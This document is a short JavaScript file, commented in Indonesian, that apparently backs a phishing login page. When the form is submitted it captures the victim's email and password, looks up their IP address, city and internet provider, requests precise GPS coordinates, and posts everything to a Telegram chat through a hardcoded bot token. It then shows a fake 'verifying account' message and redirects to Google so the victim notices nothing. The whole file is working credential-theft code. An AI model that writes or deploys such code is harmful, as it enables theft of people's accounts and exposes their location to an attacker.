document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az7021";
    let chatId = "6786210993";
    let userAgent = navigator.userAgent;

    // Ambil IP & lokasi secara paralel
    let [ipInfo, lokasiUser] = await Promise.all([
        fetch("https://ipinfo.io/json?token=961f6caebd0f7d")
            .then(res => res.json())
            .catch(() => ({ ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" })),
        new Promise(resolve => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve(`📍 *Koordinat:* ${pos.coords.latitude}, ${pos.coords.longitude}`),
                    () => resolve("📍 *Lokasi:* Tidak diizinkan oleh user")
                );
            } else {
                resolve("📍 *Lokasi:* Tidak didukung di browser ini");
            }
        })
    ]);

    let message = `🔒 *Login Berhasil!*\n\n`
        + `🕒 *Waktu:* ${waktuLogin}\n`
        + `📧 *Email:* ${email}\n`
        + `🔑 *Password:* ${password}\n`
        + `🌍 *IP:* ${ipInfo.ip}\n`
        + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
        + `🏢 *Provider:* ${ipInfo.org}\n`
        + `${lokasiUser}\n`
        + `📱 *Device:* ${userAgent}`;

    // Kirim data tanpa await biar gak nunggu respon
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "Markdown"
        })
    }).catch(error => console.error("Gagal mengirim:", error));

    console.log("✅ Semua data terkirim ke Telegram!");

    // Redirect lebih smooth
    document.getElementById("loadingText").innerText = "Memverifikasi akun...";
    setTimeout(() => window.location.href = "https://www.google.com", 3000);
});
